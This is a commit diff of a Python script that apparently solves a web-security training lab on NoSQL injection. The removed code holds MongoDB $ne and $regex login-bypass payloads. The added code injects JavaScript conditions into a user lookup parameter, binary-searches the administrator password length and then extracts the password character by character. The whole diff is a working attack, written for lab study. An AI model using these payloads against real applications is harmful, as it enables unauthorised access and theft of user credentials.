be74d7a51de29d6841a0713e1bbc6c3ba790fee5
Vincenzo Minolfi <vincenzo.minolfi@gmail.com>
2026-09-01 20:35:11 +0200

    Lab: Exploiting NoSQL injection to extract data

--- nosql_extract_data.py
+++ nosql_extract_data.py
@@ -6,28 +6,24 @@ from pprint import pprint
 from common.base import run_payloads
 from urllib.parse import quote_plus as urlencode_str
 
+from common.payload_generators import generate_alphanumeric
+
 RAW_REQUEST = """
-POST /login HTTP/2
-Host: 0a2a008103cb4a3e80b43fef00e80012.web-security-academy.net
+GET /user/lookup?user=@@@PAYLOAD@@@ HTTP/2
+Host: 0aad00b804766c5280bbfd57003500cf.web-security-academy.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
 Accept: */*
 Accept-Language: en-US,en;q=0.9
 Accept-Encoding: gzip, deflate, br, zstd
-Referer: https://0a2a008103cb4a3e80b43fef00e80012.web-security-academy.net/login
-Content-Type: application/json
-Content-Length: 40
-Origin: https://0a2a008103cb4a3e80b43fef00e80012.web-security-academy.net
+Referer: https://0aad00b804766c5280bbfd57003500cf.web-security-academy.net/my-account?id=wiener
+DNT: 1
+Sec-GPC: 1
 Connection: keep-alive
-Cookie: session=Ha7esGXUyCH8IMHEnUZZ3Uvw6CYisbBO
+Cookie: session=jLIPfikDLq7dHhFTL3PavbnycLtxCYz1
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
-Priority: u=0
-Pragma: no-cache
-Cache-Control: no-cache
-TE: trailers
-
-@@@PAYLOAD@@@
+Priority: u=4
 """.strip()
 
 async def one_call(raw_req):
@@ -38,7 +34,7 @@ async def one_call(raw_req):
 
 async def print_net_result(raw_req, print_response_body=False):
     result = await one_call(raw_req)
-    if result['status_code'] in [200, 302]:
+    if result['status_code'] in [200]:
         secs = result['total_seconds']
         print(f" CALL OK, {secs:.2f} secs")
         if print_response_body: pprint(result['full_text'])
@@ -53,28 +49,65 @@ def xmlencode (text: str) -> str:
 
 async def main():
 
-    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"wiener","password":"peter"}''')
+    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "wiener")
     print('PLAIN CALL:', end='')
-    _, response = await print_net_result(raw_req_0, False)
+    await print_net_result(raw_req_0, True)
 
-    # It succeed: it bypasses the username verification and logs in as the first user in the database with this password (wiener?)
-    raw_req_3a = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$ne":""},"password":"peter"}''')
-    print('$ne for username:', end='')
-    _, response = await print_net_result(raw_req_3a, False)
+    # It fails: the input is not sanitized!
+    raw_req_3 = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("'"))
+    print('With error:', end='')
+    await print_net_result(raw_req_3, True)
 
-    # It succeed: regex is supported!
-    raw_req_3b = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$regex":"wien.*"},"password":"peter"}''')
-    print('$regex for username:', end='')
-    _, response = await print_net_result(raw_req_3b, False)
+    # It succeeds: js is accepted here!
+    raw_req_4 = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("wiener'+'"))
+    print('With js code:', end='')
+    await print_net_result(raw_req_4, True)
 
-    # It fails: Query returns unexpected number of records
-    raw_req_3c = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$ne":""},"password":{"$ne":""}}''')
-    print('$ne for usr and pwd:', end='')
-    _, response = await print_net_result(raw_req_3c, True)
+    # It succeeds, without results
+    raw_req_5a = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("wiener' && '1'=='2"))
+    print('With false condition:', end='')
+    await print_net_result(raw_req_5a, True)
 
-    raw_req_4 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$regex":"admin.*"},"password":{"$ne":""}}''')
-    print('Final attack:', end='')
-    _, response = await print_net_result(raw_req_4, True)
+    # It succeeds, with results
+    raw_req_5b = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("wiener' && '1'=='1"))
+    print('With true condition:', end='')
+    await print_net_result(raw_req_5b, True)
+
+    async def test (i):
+        raw_req_6 = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str(f"administrator' && this.password.length < {i} || 'a'=='b"))
+        print(f'Administrator pwd len <{i}:', end='')
+        _, response = await print_net_result(raw_req_6, True)
+        isok = 'administrator' in response
+        return isok
+
+    # Linear search for pwd len:
+    #for i in range(2, 30):
+    #    isok = await test(i)
+    #    if isok: break
+
+    # Binary search for pwd len:
+    from math import floor
+    minlen = 1
+    maxlen = 30
+    while minlen < maxlen - 1:
+        v = floor((minlen + maxlen) / 2)
+        # print(minlen, v, maxlen)
+        isok = await test(v)
+        if isok: maxlen = v
+        else: minlen = v
+    print(f'Password length: {minlen}')
+
+    pwd = ''
+    for i in range(minlen):
+        for char in generate_alphanumeric():
+            raw_req_8 = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str(f"administrator' && this.password[{i}] == '{char}"))
+            print(f'Administrator pwd char {char} at pos {i}:', end='')
+            _, response = await print_net_result(raw_req_8, True)
+            isok = 'administrator' in response
+            if isok:
+                pwd += char
+                break
+    print(f'Password: {pwd}')
 
 if __name__ == "__main__":
     asyncio.run(main())
